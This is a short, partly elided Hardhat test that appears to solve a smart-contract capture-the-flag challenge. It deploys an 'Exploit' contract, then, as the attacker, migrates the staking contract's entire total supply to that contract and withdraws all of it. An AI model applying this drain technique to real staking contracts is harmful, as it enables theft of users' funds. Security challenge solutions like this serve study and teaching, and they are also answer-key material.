...
before(async () => {
  ...
  let exploitFactory = await ethers.getContractFactory('Exploit');
...
it("solves the challenge", async function () {
  let totalSupply = await tastyStaking.connect(attacker).totalSupply();
  tastyStaking.connect(attacker).migrateStake(exploit.address, totalSupply);
  await tastyStaking.connect(attacker).withdraw(totalSupply, false);
});
